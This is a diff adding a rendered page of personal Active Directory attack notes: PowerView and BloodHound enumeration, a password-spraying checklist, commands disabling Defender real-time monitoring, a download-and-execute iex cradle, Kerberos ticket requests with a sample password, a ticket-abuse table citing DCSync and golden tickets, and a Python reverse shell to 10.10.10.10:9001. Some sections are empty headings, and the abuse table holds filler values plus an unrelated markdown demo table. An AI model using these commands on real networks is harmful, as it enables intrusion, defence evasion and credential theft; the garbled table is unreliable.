@@ -1,0 +1,192 @@
+I"�><h1 id="infastructure">INFASTRUCTURE</h1>
+
+<h1 id="active-directory">ACTIVE DIRECTORY</h1>
+
+<h2 id="domain-enumeration">DOMAIN ENUMERATION</h2>
+
+<p>I do prefer to do manual enumeration but on large enterprice networks, some automated scan would come in handy to search for low hanging fruits</p>
+
+<p>Automated Scanners
+AdPeas.ps1</p>
+
+<p>You can aswell use BloodHound to visualize data</p>
+
+<blockquote>
+  <p>checklist
+check password policy
+gather usernam -
+Pray and Spray with CME</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#For SharpHound.exe</span><span class="w">
+</span><span class="o">.</span><span class="n">/SharpHound.exe</span><span class="w"> </span><span class="nt">--CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w">
+
+</span><span class="c">#For SharpHound.ps1</span><span class="w">
+</span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-ZipFileName</span><span class="w"> </span><span class="nx">ratloot</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Domain</span><span class="w">  </span><span class="nx">rat.local</span><span class="w">
+
+</span></code></pre></div></div>
+<p><span class="demo-highlight"># Patch AMSI or disable AV</span></p>
+
+<p>Getting hands dirty with PowerView</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">      </span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealTimeMonitoring</span><span class="w"> </span><span class="nt">-DisableAVIOProtection</span><span class="w"> </span><span class="bp">$true</span><span class="w">
+      </span><span class="n">iex</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'http:/x.x.x.x./PowerView_DeV.ps1'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p><br />
+ <span class="demo-highlight"># Domain &amp; Controller Enumeration</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-NetDomain</span><span class="w"> 
+            
+</span><span class="n">Get-NetDomainController</span><span class="w">     
+</span></code></pre></div></div>
+<p><br />
+ <span class="demo-highlight"># User Enumeration</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get all users present in the domain</span><span class="w">
+</span><span class="n">Get-NetUsers</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">cn</span><span class="w">
+
+</span><span class="c"># Get users sorted with most logoncounts</span><span class="w">
+</span><span class="n">Get-UserProperty</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">logoncount</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="nx">logoncount</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sort</span><span class="w"> </span><span class="nx">logoncount</span><span class="w"> </span><span class="nt">-Descending</span><span class="w">
+
+</span><span class="c"># Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying</span><span class="w">
+</span><span class="n">Get-NetUsers</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">username.txt</span><span class="w">
+
+</span></code></pre></div></div>
+<p><br />
+<span class="demo-highlight"># Group Enumeration </span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get AD groups data either all or of a user</span><span class="w">
+</span><span class="n">Get-NetGroup</span><span class="w"> </span><span class="p">[</span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="n">target</span><span class="err">&gt;</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-FullData</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"*admin*"</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-Username</span><span class="w"> </span><span class="s1">'user_name'</span><span class="p">]</span><span class="w">
+
+</span><span class="c"># Get Members of a group</span><span class="w">
+</span><span class="n">Get-NetGroupMember</span><span class="w"> </span><span class="p">[</span><span class="nt">-GroupName</span><span class="w"> </span><span class="s1">'group_name'</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-Recurse</span><span class="p">]</span><span class="w">	
+</span></code></pre></div></div>
+<p><br />
+<span class="demo-highlight"># Share Enumeration</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Find interesting shares</span><span class="w">
+</span><span class="n">Invoke-ShareFinder</span><span class="w"> </span><span class="nt">-ExcludeStandard</span><span class="w"> </span><span class="nt">-ExcludeIPC</span><span class="w"> </span><span class="nt">-ExcludePrint</span><span class="w">	
+
+</span></code></pre></div></div>
+<p><br />
+<span class="demo-highlight"># GPO Enumeration</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List all GPOs in the domain</span><span class="w">
+</span><span class="n">Get-NetGPO</span><span class="w"> </span><span class="p">[</span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="n">rat.domain</span><span class="err">&gt;</span><span class="p">]</span><span class="w">	
+
+</span><span class="c">#Find Interesting GPO</span><span class="w">
+</span><span class="n">Get-NetGPOGroup</span><span class="w">
+
+</span></code></pre></div></div>
+<p><br />
+<span class="demo-highlight"># OU Enumeration</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get all OU (Organisational Units) in the domain</span><span class="w">
+</span><span class="n">Get-NetOU</span><span class="w"> </span><span class="p">[</span><span class="nt">-FullData</span><span class="p">]</span><span class="w">
+
+</span><span class="c"># Get gplink of an OU to get GPOs applied to it</span><span class="w">
+</span><span class="p">(</span><span class="n">Get-NetOU</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'test'</span><span class="p">)</span><span class="o">.</span><span class="nf">gplink</span><span class="w">	
+
+</span><span class="c"># Get GPO of a GPlink</span><span class="w">
+</span><span class="n">Get-NetGPO</span><span class="w"> </span><span class="nt">-GPOName</span><span class="w"> </span><span class="s1">'{cadkfapsdfasdfaudvajkd}'</span><span class="w">
+
+</span><span class="c"># Get GPO of an OU using gplink</span><span class="w">
+</span><span class="p">((</span><span class="n">Get-NetOU</span><span class="w"> </span><span class="nt">-FullData</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">OU_NAME</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="nf">gplink</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s2">"cn="</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s2">","</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-NetGPO</span><span class="w">
+</span></code></pre></div></div>
+<p><br />
+<span class="demo-highlight"># ACL Enumeration</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Find interesting ACL</span><span class="w">
+</span><span class="n">Invoke-ACLScanner</span><span class="w"> </span><span class="nt">-ResolveGUIDS</span><span class="w">	
+
+</span><span class="c"># Find interesting ACL owned by a certain user :rat:</span><span class="w">
+</span><span class="n">Invoke-ACLScanner</span><span class="w"> </span><span class="nt">-ResolveGUIDS</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'rat'</span><span class="p">}</span><span class="w">	
+</span></code></pre></div></div>
+<p><br />
+<span class="demo-highlight"># Trust Enumeration</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Map all domain trust</span><span class="w">
+</span><span class="n">Get-NetDomainTrust</span><span class="w"> </span><span class="p">[</span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="n">target</span><span class="err">&gt;</span><span class="p">]</span><span class="w">
+
+</span><span class="c"># Get all the domain of a forest</span><span class="w">
+</span><span class="n">Get-NetForestDomain</span><span class="w"> </span><span class="p">[</span><span class="nt">-Forest</span><span class="w"> </span><span class="err">&lt;</span><span class="n">target</span><span class="err">&gt;</span><span class="p">]</span><span class="w">	
+</span></code></pre></div></div>
+<p><br />
+<span class="demo-highlight"># Hunting Users and Sessions</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get list of all machines where current user has local admin access</span><span class="w">
+</span><span class="n">Find-LocalAdminAccess</span><span class="w">	
+
+</span><span class="c"># Invoke-EnumerateLocalAdmin	</span><span class="w">
+</span><span class="n">Find</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">admins</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">computers</span><span class="w">
+
+</span><span class="c"># Find machines where a domain admin has a session, checkaccess tells you if you also have access to that machine</span><span class="w">
+</span><span class="n">Invoke-UserHunter</span><span class="w"> </span><span class="p">[</span><span class="nt">-GroupName</span><span class="w"> </span><span class="err">&lt;</span><span class="n">group_name</span><span class="err">&gt;</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-CheckAccess</span><span class="p">]</span><span class="w">	
+
+</span><span class="c"># Get list of active sessions on a computer</span><span class="w">
+</span><span class="n">Get-NetSession</span><span class="w"> </span><span class="p">[</span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="n">comp_name</span><span class="err">&gt;</span><span class="p">]</span><span class="w">	
+
+</span><span class="c"># Get list of Users logged-on on a system</span><span class="w">
+</span><span class="n">Get-LoggedOnLocal</span><span class="w"> </span><span class="p">[</span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="n">comp_name</span><span class="err">&gt;</span><span class="p">]</span><span class="w">	
+</span></code></pre></div></div>
+
+<p><br /></p>
+<h2 id="kerberos-attacks">Kerberos Attacks</h2>
+<p><br />
+<span class="demo-highlight"># working from linux with creds</span></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># username : rat</span><span class="w">
+</span><span class="c"># password : r@tty419</span><span class="w">
+</span><span class="c"># domain : rodent.local</span><span class="w">
+</span><span class="n">impacket-getTGT</span><span class="w"> </span><span class="nx">rodent.local/rat:</span><span class="s1">'r@tty419'</span><span class="w">
+
+
+</span><span class="c"># now import the ticket into memory</span><span class="w">
+</span><span class="n">export</span><span class="w"> </span><span class="nx">KRB5CCNAME</span><span class="o">=</span><span class="n">/tmp/rat.ccache</span><span class="w">
+
+</span><span class="c"># confirm the ticket in memory </span><span class="w">
+</span><span class="n">klist</span><span class="w">
+</span></code></pre></div></div>
+<p><br />
+<br />
+<span class="demo-highlight"># working from windows with creds</span></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using Rubeus</span><span class="w">
+
+</span><span class="o">.</span><span class="n">/Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p><br />
+using <em>/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm</em> in Rubeus you can ask for all the tickets
+<br />
+| Service Ticket   | Service Type | # Abuse funtino |
+|————–|:—–:|———–:|
+| CIFS         |Windows FileShare, PsExec |        739 |
+| HOST         |PsRemoting, Scheduled Task | adcad |
+| HTTP         |PsRemoting|$sess = New-PsSession -Computername DC01; Enter-PsSession -Session $sess |
+| LDAP         |LDAP Ops, DCSync |Mimikatz &gt; lsadump::dcsync /rat.local:$DC-IP /all /csv |
+| RPCSS        |  1.99 |        739 |
+| KRBTGT       |Golden Ticket |do anything lol,|
+| HOST &amp; RPCSS |WMI |  WMIEXEC|
+| HOST &amp; HTTP |WinRM |  WMIEXEC|</p>
+
+<p>|                |ASCII                          |HTML                         |
+|—————-|——————————-|—————————–|
+|Single backticks|<code class="language-plaintext highlighter-rouge">'Isn't this fun?'</code>            |’Isn’t this fun?’            |
+|Quotes          |<code class="language-plaintext highlighter-rouge">"Isn't this fun?"</code>            |”Isn’t this fun?”            |
+|Dashes          |<code class="language-plaintext highlighter-rouge">-- is en-dash, --- is em-dash</code>|– is en-dash, — is em-dash|
+<br /></p>
+
+<h2 id="rtf--scf-weaponization">RTF &amp;&amp; SCF Weaponization</h2>
+
+<p><br />
+<br />
+<br /></p>
+
+<h1 id="mitm6-ipv6-attack">MITM6 IPV6 Attack</h1>
+
+<p><br />
+<br />
+<br /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span>
+</code></pre></div></div>
+:ET
